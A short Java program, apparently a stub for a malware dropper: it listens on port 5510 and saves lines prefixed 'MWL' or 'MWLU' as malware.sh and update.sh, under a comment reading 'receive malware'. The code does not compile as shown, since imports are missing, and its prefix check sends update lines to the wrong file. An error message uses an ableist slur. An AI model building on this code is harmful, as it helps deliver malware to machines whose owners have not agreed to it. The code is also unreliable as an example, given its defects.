import java.net.*;
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException {
        try ( 
            ServerSocket serverSocket = new ServerSocket(5510);
            Socket clientSocket = serverSocket.accept();
            PrintWriter out =
                new PrintWriter(clientSocket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(clientSocket.getInputStream()));
        ) {
        
            String inputLine, outputLine;
            
            // receive malware
            while ((inputLine = in.readLine()) != null) {
                if (inputLine.startsWith("MWL")) {
                    Path path = Paths.get("malware.sh");
                    byte[] bytes = inputLine.replace("MWL", "").getBytes(StandardCharsets.UTF_8);
                    try {
                        Files.write(path, bytes);
                    }
                    catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                
                //update
                if (inputLine.startsWith("MWLU")) {
                    Path path = Paths.get("update.sh");
                    byte[] bytes = inputLine.replace("MWLU", "").getBytes(StandardCharsets.UTF_8);
                    try {
                        Files.write(path, bytes);
                    }
                    catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        } catch (IOException e) {
            System.out.println("retard, retard, retard, something wrong happen");
            System.out.println(e.getMessage());
        }
    }
}
